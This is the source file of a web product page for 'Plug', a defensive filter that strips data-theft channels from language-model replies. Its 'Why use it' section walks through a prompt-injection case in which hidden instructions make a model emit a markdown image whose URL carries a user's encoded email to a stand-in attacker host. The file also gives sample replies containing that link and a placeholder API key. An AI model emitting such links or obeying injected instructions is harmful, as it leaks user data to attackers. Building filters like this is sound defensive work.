import type { Metadata } from "next";
import PlugDemo from "@/components/PlugDemo";
import Code from "@/components/Code";
import ProductPage from "@/components/ProductPage";
import { Callout, H3, Mono, P, Steps, Table } from "@/components/doc";
import { REPO } from "@/lib/site";

export const metadata: Metadata = {
  title: "Plug: stop data leaving through model output | LeakyByte",
  description: "Plug scans model output for data-theft channels such as image links that carry data, hidden characters and secrets, and blocks them before your app renders the reply.",
};

const attack = `Here is your summary!

![](https://tracker.badsite.example/pixel.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQuZXhhbXBsZQ==)`;

const run = `$ cat reply.txt | node cli/leakybyte.ts plug --allow docs.example.com`;
const replyIn = `Your order shipped!
![](https://tracker.badsite.example/pixel.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQuZXhhbXBsZQ==)
Docs: https://docs.example.com/shipping
Key: sk-ant-api03-Zk3vQ9xT2mLp8RwYc5HnJd7A`;
const replyOut = `Your order shipped!
![]([blocked link to tracker.badsite.example])
Docs: https://docs.example.com/shipping
Key: [removed ANTHROPIC_KEY]

URL: tracker.badsite.example is an image from an untrusted host (images load automatically)
SECRET: ANTHROPIC_KEY in output`;

const lib = `import { plug } from "./lib/plug.ts";

const reply = await getModelReply();           // text from Claude
const { text, findings } = plug(reply, ["cdn.example.com"]);

if (findings.length) console.warn("Plug changed a reply:", findings);
render(text);                                   // render the sanitized text`;

const csp = `Content-Security-Policy: default-src 'self'; img-src 'self' https://cdn.example.com; connect-src 'self'`;

export default function Page() {
  return (
    <ProductPage
      slug="plug"
      tagline="A model reply can carry your data out. Plug closes the exits."
      intro="Plug scans what the model wrote for ways data can leave once your app displays it: image links with data in the URL, invisible characters and secrets. It blocks them before anything is rendered."
      sections={[
        {
          id: "try", title: "Try it",
          body: (<><P>The sample reply was steered by an attacker. Edit it, or change which hosts you trust, and see what your app would render. Everything runs in your browser.</P><div className="mt-6"><PlugDemo /></div></>),
        },
        {
          id: "why", title: "Why use it",
          body: (<>
            <P>When an assistant reads untrusted content, such as an email, a web page or a shared document, that content can contain instructions. One well-known trick tells the model to include a markdown image whose address holds the user data. Your app renders the image, the browser fetches it automatically, and the data reaches the attacker. The user never clicks anything.</P>
            <Code label="a steered reply">{attack}</Code>
            <P>The model did what the hidden text said. Nothing in the reply looks broken. Plug looks at the output, sees an image from a host you did not approve with data in its address, and removes it.</P>
          </>),
        },
        {
          id: "how", title: "What Plug checks",
          body: (<>
            <Steps items={[
              ["Hidden characters", <>Zero-width characters, text-direction controls and the Unicode tag block are removed. Attackers use them to hide instructions or to smuggle data in text that looks empty.</>],
              ["Links and images", <>Every link is checked. An image from a host you have not listed is always blocked, because images load without a click. Other links are blocked if the address carries data in its query, fragment or login, hides data in the hostname, or has a long encoded blob in the path.</>],
              ["Secrets in output", <>The same detectors as Veil run over the reply. Keys, tokens, emails, card numbers and so on are replaced with <Mono>[removed KIND]</Mono>.</>],
            ]} />
            <P>Plug also reads the way browsers do: uppercase schemes, protocol-relative links, backslashes, HTML-encoded characters, and addresses broken by a tab or newline are all caught.</P>
          </>),
        },
        {
          id: "setup", title: "Set it up",
          body: (<>
            <P>Plug is a small function with no dependencies. It is not on npm yet, so copy <Mono>lib/plug.ts</Mono> and <Mono>lib/redact.ts</Mono> from the repository into your project, or clone the repository and use the command line tool. Node 22.18 or newer runs the files directly.</P>
            <Code label="terminal">{`git clone ${REPO}.git
cd leakybyte && npm install`}</Code>
            <H3>In your code</H3>
            <Code label="TypeScript">{lib}</Code>
            <P>The second argument lists hosts you trust. Links and images from those hosts pass untouched. The function returns the sanitized text and a list of findings.</P>
            <H3>From the command line</H3>
            <Code label="terminal">{run}</Code>
            <Callout title="Use two dashes with npm">If you call it as an npm script, write <Mono>npm run lb -- plug --allow docs.example.com</Mono>. Without the dashes npm swallows the flag.</Callout>
          </>),
        },
        {
          id: "example", title: "Example",
          body: (<>
            <P>This is real output. The tracking image is blocked, the trusted docs link is untouched, and the key is removed.</P>
            <div className="grid gap-4 md:grid-cols-2">
              <Code label="Model reply">{replyIn}</Code>
              <Code label="What your app renders, and what Plug reports">{replyOut}</Code>
            </div>
          </>),
        },
        {
          id: "findings", title: "Findings",
          body: (<Table head={["Type", "Meaning", "What Plug does"]} rows={[
            ["URL", "A link or image that can carry data out, or an image from an untrusted host", "Replaces it with [blocked link to host]"],
            ["HIDDEN_TEXT", "Invisible characters in the reply", "Removes them"],
            ["SECRET", "A key, token or personal detail in the output", "Replaces it with [removed KIND]"],
          ]} />),
        },
        {
          id: "csp", title: "Pair it with a content security policy",
          body: (<>
            <P>Plug is a filter, and filters can be bypassed. The strongest protection is to stop the browser from loading anything you did not approve. Send a policy like this on the page that shows model output:</P>
            <Code label="HTTP header">{csp}</Code>
            <P>With that header, even an image that gets past Plug cannot be fetched from an unapproved host. Use both.</P>
          </>),
        },
        {
          id: "limits", title: "Limits to know about",
          body: (
            <ul className="mt-4 max-w-[68ch] list-disc space-y-3 pl-5 leading-relaxed text-muted">
              <li>Plug works on plain or markdown text. It is not an HTML sanitiser. If you render HTML, also use one.</li>
              <li>Secret detection also removes emails and phone numbers. If your replies legitimately contain them, Plug will remove them for now. Choosing which kinds to keep is planned.</li>
              <li>It checks complete text. For streaming replies, check the finished text before the final render. Checking inside a stream is not built yet.</li>
              <li>It does not follow redirects. A trusted host that redirects elsewhere is still trusted.</li>
              <li>It is a heuristic filter, not a guarantee. Use it as one layer.</li>
            </ul>
          ),
        },
      ]}
    />
  );
}
